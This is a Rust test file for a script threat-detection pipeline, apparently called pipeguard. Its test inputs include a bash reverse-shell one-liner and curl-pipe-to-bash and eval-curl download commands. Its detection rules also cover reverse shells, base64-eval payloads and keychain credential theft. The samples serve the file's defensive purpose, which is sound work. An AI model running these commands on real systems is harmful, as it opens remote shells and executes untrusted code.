use pipeguard::detection::pipeline::{DetectionPipeline, DetectionResult, PipelineConfig};
use pipeguard::detection::threat::{ThreatLevel, ThreatResponse};
use tempfile::TempDir;
use std::fs;

fn create_test_rules() -> String {
    r#"
        rule reverse_shell {
            meta:
                severity = 10
                description = "Reverse shell detected"
            strings:
                $bash_i = "bash -i"
                $dev_tcp = "/dev/tcp/"
            condition:
                $bash_i and $dev_tcp
        }

        rule base64_payload {
            meta:
                severity = 5
                description = "Base64 encoded payload"
            strings:
                $b64_decode = "base64 -d"
                $eval = "eval"
            condition:
                $b64_decode and $eval
        }

        rule credential_theft {
            meta:
                severity = 9
                description = "Credential theft pattern"
            strings:
                $keychain = "security find-generic-password"
                $dump = "dump"
            condition:
                $keychain or ($dump and $keychain)
        }
    "#.to_string()
}

#[test]
fn pipeline_detects_high_severity_threat() {
    let rules = create_test_rules();
    let config = PipelineConfig::default();
    let pipeline = DetectionPipeline::new(&rules, config).unwrap();

    let malicious = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
    let result = pipeline.analyze(malicious).unwrap();

    assert!(result.is_threat());
    assert_eq!(result.threat_level(), ThreatLevel::High);
    assert_eq!(result.recommended_response(), ThreatResponse::Block);
}

#[test]
fn pipeline_detects_medium_severity_threat() {
    let rules = r#"
        rule staged_download {
            meta:
                severity = 7
                description = "Staged download pattern"
            strings:
                $curl = "curl"
                $pipe_bash = "| bash"
            condition:
                $curl and $pipe_bash
        }
    "#;
    let config = PipelineConfig::default();
    let pipeline = DetectionPipeline::new(rules, config).unwrap();

    let script = "curl https://example.com/script.sh | bash";
    let result = pipeline.analyze(script).unwrap();

    assert!(result.is_threat());
    assert_eq!(result.threat_level(), ThreatLevel::Medium);
    assert_eq!(result.recommended_response(), ThreatResponse::Prompt);
}

#[test]
fn pipeline_allows_clean_scripts() {
    let rules = create_test_rules();
    let config = PipelineConfig::default();
    let pipeline = DetectionPipeline::new(&rules, config).unwrap();

    let clean = r#"
        #!/bin/bash
        echo "Hello, World!"
        ls -la
    "#;
    let result = pipeline.analyze(clean).unwrap();

    assert!(!result.is_threat());
    assert_eq!(result.threat_level(), ThreatLevel::None);
    assert_eq!(result.recommended_response(), ThreatResponse::Allow);
}

#[test]
fn pipeline_aggregates_multiple_matches() {
    let rules = r#"
        rule obfuscation {
            meta:
                severity = 5
                description = "Obfuscation"
            strings:
                $eval = "eval"
            condition:
                $eval
        }

        rule download {
            meta:
                severity = 6
                description = "Download"
            strings:
                $curl = "curl"
            condition:
                $curl
        }
    "#;
    let config = PipelineConfig::default();
    let pipeline = DetectionPipeline::new(rules, config).unwrap();

    let script = "eval $(curl https://example.com/script.sh)";
    let result = pipeline.analyze(script).unwrap();

    assert!(result.is_threat());
    assert_eq!(result.match_count(), 2);
    // Overall level based on max severity (6 = Low)
    assert_eq!(result.threat_level(), ThreatLevel::Low);
}

#[test]
fn pipeline_provides_detailed_report() {
    let rules = create_test_rules();
    let config = PipelineConfig::default();
    let pipeline = DetectionPipeline::new(&rules, config).unwrap();

    let malicious = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
    let result = pipeline.analyze(malicious).unwrap();

    let report = result.report();
    assert!(report.contains("reverse_shell"));
    assert!(report.contains("Reverse shell detected"));
}

#[test]
fn pipeline_loads_rules_from_directory() {
    let temp_dir = TempDir::new().unwrap();

    // Create multiple rule files
    let rule1 = r#"
        rule test1 {
            meta:
                severity = 5
                description = "Test 1"
            strings:
                $a = "test1"
            condition:
                $a
        }
    "#;
    let rule2 = r#"
        rule test2 {
            meta:
                severity = 8
                description = "Test 2"
            strings:
                $a = "test2"
            condition:
                $a
        }
    "#;

    fs::write(temp_dir.path().join("rule1.yar"), rule1).unwrap();
    fs::write(temp_dir.path().join("rule2.yar"), rule2).unwrap();

    let config = PipelineConfig::default();
    let pipeline = DetectionPipeline::from_rules_dir(temp_dir.path(), config).unwrap();

    // Should detect both rules
    let result1 = pipeline.analyze("this has test1 in it").unwrap();
    assert!(result1.is_threat());

    let result2 = pipeline.analyze("this has test2 in it").unwrap();
    assert!(result2.is_threat());
    assert_eq!(result2.threat_level(), ThreatLevel::Medium);
}

#[test]
fn pipeline_computes_content_hash() {
    let rules = create_test_rules();
    let config = PipelineConfig::default();
    let pipeline = DetectionPipeline::new(&rules, config).unwrap();

    let script = "echo 'test'";
    let result = pipeline.analyze(script).unwrap();

    // Should have SHA-256 hash
    let hash = result.content_hash();
    assert_eq!(hash.len(), 64); // SHA-256 hex string
}
